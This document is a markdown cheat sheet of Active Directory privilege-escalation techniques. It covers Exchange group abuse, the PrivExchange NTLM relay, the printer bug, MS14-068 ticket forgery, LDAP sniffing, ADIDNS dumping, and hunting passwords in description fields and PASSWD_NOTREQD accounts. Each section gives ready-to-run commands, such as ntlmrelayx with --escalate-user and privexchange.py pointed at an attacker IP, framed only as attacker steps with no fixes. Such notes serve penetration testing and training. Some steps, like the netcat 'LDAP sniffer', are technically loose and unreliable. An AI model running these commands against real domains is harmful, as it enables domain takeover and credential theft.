## **1. Exchange-Related Group Membership**

### **Issue: Weak Exchange Permissions**

- In an AD environment with Microsoft Exchange, certain security groups like **Exchange Windows Permissions** and **Organization Management** have high privileges.
- If a low-privileged user is a member of these groups, they can modify AD objects or escalate privileges to **Domain Admin**.

### **Exploitation**

- Attackers can abuse these groups to grant themselves higher privileges using PowerShell:
    
    ```powershell
    Get-ADGroupMember -Identity "Exchange Windows Permissions"
    Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members attacker_user
    ```
    
- Once inside, attackers can abuse **WriteDACL** permissions to modify privileges and escalate to **Domain Admin**.
    

---

## **2. PrivExchange Attack**

### **Issue: NTLM Relay in Exchange**

- Microsoft Exchange allows certain users to **relay authentication requests**.
- Attackers can trick the Exchange server into **authenticating to their machine**, allowing them to escalate privileges.

### **Exploitation**

1. **Setup NTLM relay with `ntlmrelayx`**
    
    ```bash
    python3 ntlmrelayx.py -t ldaps://dc.domain.local --escalate-user attacker_user
    ```
    
2. **Trigger authentication using PrivExchange**
    
    ```bash
    python3 privexchange.py -u victim_user -d domain.local -p password -ah attacker_ip
    ```
    
3. If successful, the attacker can get **DCSync privileges**, enabling them to **dump all domain passwords**.

---

## **3. Printer Bug (MS-RPRN)**

### **Issue: Unauthenticated Remote Spooler Access**

- The **Windows Print Spooler service** allows unauthenticated users to force a machine to authenticate to an attacker's server.
- Attackers can exploit this to **relay authentication requests** and escalate privileges.

### **Exploitation**

1. **Check if the target is vulnerable**
    
    ```powershell
    Get-SpoolStatus -ComputerName DC01
    ```
    
2. **Relay authentication using NTLM relay**
    
    ```bash
    python3 ntlmrelayx.py -t ldaps://dc.domain.local --escalate-user attacker_user
    ```
    
3. If successful, attackers can **modify AD permissions** and escalate to **Domain Admin**.

---

## **4. MS14-068 (Forged PAC Attack)**

### **Issue: Kerberos PAC Forgery**

- In older Windows environments (pre-2014), attackers can forge **Kerberos tickets (TGTs)** and escalate to **Domain Admin**.

### **Exploitation**

1. **Generate a forged Kerberos ticket**
    
    ```bash
    python3 ms14-068.py -u user -d domain.local -p password -kdc-ip dc_ip
    ```
    
2. **Use the forged ticket to access domain resources**.

---

## **5. Sniffing LDAP Credentials**

### **Issue: Unencrypted LDAP Authentication**

- Some AD environments use **unencrypted LDAP (port 389)**, allowing attackers to sniff credentials.

### **Exploitation**

1. **Set up a netcat listener on port 389**
    
    ```bash
    nc -lvnp 389
    ```
    
2. **Wait for users to send credentials over LDAP**
    - Attackers can collect **plaintext credentials** and use them for further attacks.

---

## **6. ADIDNS Enumeration**

### **Issue: Exposed AD DNS Records**

- AD environments store **sensitive DNS records** that can reveal:
    - Internal servers
    - Domain controllers
    - Hidden services

### **Exploitation**

- **Dump all AD DNS records**
    
    ```bash
    adidnsdump -u domain\\user -p password ldap://dc_ip
    ```
    
- **Resolve unknown DNS records to IP addresses**
    
    ```bash
    adidnsdump -r -u domain\\user ldap://dc_ip
    ```
    
- Attackers can use this information to **map the network** and target vulnerable hosts.

---

## **7. Password in Description Field**

### **Issue: Storing Credentials in AD User Description**

- Some admins **accidentally store passwords** in the userâ€™s **description** field.

### **Exploitation**

- **Find stored passwords**
    
    ```powershell
    Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
    ```
    
- If passwords are found, they can be **used for lateral movement**.

---

## **8. PASSWD_NOTREQD Flag**

### **Issue: Accounts with No Password Requirement**

- Some AD accounts have the **PASSWD_NOTREQD** flag set, meaning they can have **empty passwords**.

### **Exploitation**

1. **Find vulnerable accounts**
    
    ```powershell
    Get-DomainUser -UACFilter PASSWD_NOTREQD
    ```
    
2. **Attempt login with empty passwords**
    - If successful, attackers get **unauthorized access** to the domain.

